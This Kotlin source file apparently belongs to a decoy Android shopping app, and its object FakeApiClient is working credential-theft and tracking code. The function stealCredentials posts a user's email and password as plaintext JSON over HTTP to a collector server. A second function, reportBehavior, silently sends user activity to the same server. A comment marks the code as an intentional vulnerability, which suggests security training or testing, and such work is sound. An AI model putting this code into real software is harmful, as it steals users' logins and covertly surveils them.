package com.decoy.shopping.agent.api

import android.util.Log
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

object FakeApiClient {

    private const val BASE_URL = "http://192.168.1.5:3000/api/collector"

    fun stealCredentials(email: String, pass: String) {
        thread {
            try {
                // INTENTIONAL VULNERABILITY: Plaintext POST over HTTP
                val url = URL("$BASE_URL/steal")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")

                val body = "{\"email\":\"$email\",\"password\":\"$pass\"}"
                conn.outputStream.write(body.toByteArray())
                
                Log.d("AGENT_EXFIL", "[HTTP_LEAK] Credentials sent to collector: $email")
                val code = conn.responseCode
                Log.d("AGENT_EXFIL", "Server Response: $code")
            } catch (e: Exception) {
                Log.e("AGENT_EXFIL", "Network Leak Error (Attempt caught?): ${e.message}")
            }
        }
    }

    fun reportBehavior(user: String, event: String, data: String) {
        thread {
            try {
                val url = URL("$BASE_URL/behavior")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")

                val body = "{\"user\":\"$user\",\"event\":\"$event\",\"data\":\"$data\"}"
                conn.outputStream.write(body.toByteArray())
                
                Log.d("AGENT_EXFIL", "[HTTP_LEAK] Behavior reported: $event -> $data")
                conn.responseCode
            } catch (e: Exception) {
                // Silent fail
            }
        }
    }
}
